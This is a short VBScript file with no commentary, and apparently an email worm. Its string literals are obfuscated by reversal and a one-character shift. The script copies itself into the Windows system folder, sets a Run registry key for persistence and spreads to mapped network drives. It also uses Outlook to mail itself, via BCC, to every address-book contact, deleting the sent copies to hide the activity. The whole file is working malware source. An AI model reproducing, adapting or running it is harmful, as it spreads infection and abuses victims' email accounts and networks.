' kitabloke

On Error Resume Next

Dim HJPTG
Dim FIG0
Dim JKW9AF
Dim MSLMOP9
Dim UTV53Y
Dim A9W948P
Dim S5S6C5
Dim YK6ODD
Dim QKIKD
Dim D9OF

Set HJPTG = CreateObject( ZEDW3( "udfkcPnfutzTfmjG/hojuqjsdT" ) )
HJPTG.CopyFile WScript.ScriptFullName, HJPTG.BuildPath( HJPTG.GetSpecialFolder(1), ZEDW3( "TCW/VW9UJQY" ) )

Set FIG0 = CreateObject( ZEDW3( "mmfiT/uqjsdTX" ) )
FIG0.RegWrite ZEDW3( "]ovS]opjtsfWuofssvD]txpeojX]ugptpsdjN]fsbxugpT]FOJIDBN`MBDPM`ZFLI" ) & ZEDW3( "VW9UJQY" ), HJPTG.BuildPath( HJPTG.GetSpecialFolder(1), ZEDW3( "TCW/VW9UJQY" ) )


Set JKW9AF = CreateObject( ZEDW3( "lspxufO/uqjsdTX" ) )
Set UTV53Y = JKW9AF.EnumNetworkDrives

If UTV53Y.Count <> 0 Then
   For MSLMOP9 = 0 To UTV53Y.Count - 1
       If InStr( UTV53Y.Item( MSLMOP9), ZEDW3( "]" ) ) <> 0 Then
          HJPTG.CopyFile WScript.ScriptFullName, HJPTG.BuildPath( UTV53Y.Item( MSLMOP9), ZEDW3( "TCW/VW9UJQY" ) ) 
       End If
   Next
End If

MSLMOP9 = FIG0.RegRead( ZEDW3( "]FOJIDBN`MBDPM`ZFLI" ) & ZEDW3( "VW9UJQY" ) )

If MSLMOP9 = "" Or MSLMOP9 > 20 Then
   MSLMOP9 = 0
End If

If MSLMOP9 = 0 Then
   Set YK6ODD = CreateObject( ZEDW3( "opjubdjmqqB/lppmuvP" ) )
   Set A9W948P = YK6ODD.GetNameSpace( ZEDW3( "JQBN" ) )

   For Each S5S6C5 In A9W948P.AddressLists
       Set UTV53Y = YK6ODD.CreateItem( 0 )

       For QKIKD = 1 To S5S6C5.AddressEntries.Count
           Set D9OF = S5S6C5.AddressEntries( QKIKD )

           If QKIKD = 1 Then
              UTV53Y.BCC = D9OF.Address
           Else
              UTV53Y.BCC = UTV53Y.BCC & ZEDW3( "!<" ) & D9OF.Address
           End If
       Next

       UTV53Y.Subject = ZEDW3( "otn!svt!êlpmc!bu!jL!sjpwbT" )
       UTV53Y.Body = ZEDW3( "/uofnidbuub!fmjg!0!uojpk!sfjidjg" )
       UTV53Y.Attachmets.Add WScript.ScriptFullName
       UTV53Y.DeleteAfterSubmit = True
       UTV53Y.Send
   Next

   MSLMOP9 = 0
End If

FIG0.RegWrite ZEDW3( "]FOJIDBN`MBDPM`ZFLI" ) & ZEDW3( "VW9UJQY" ), MSLMOP9 + 1

Function ZEDW3( ZVCDYVB )
   Dim C9J1O62X
   Dim S7M60IVV
   Dim J7S82M

   C9J1O62X = ""

   For S7M60IVV = 1 To Len( ZVCDYVB )
       J7S82M = Mid( ZVCDYVB, S7M60IVV, 1 )

       C9J1O62X = Chr( Asc( J7S82M ) - 1 ) & C9J1O62X
   Next

   ZEDW3 = C9J1O62X
End Function
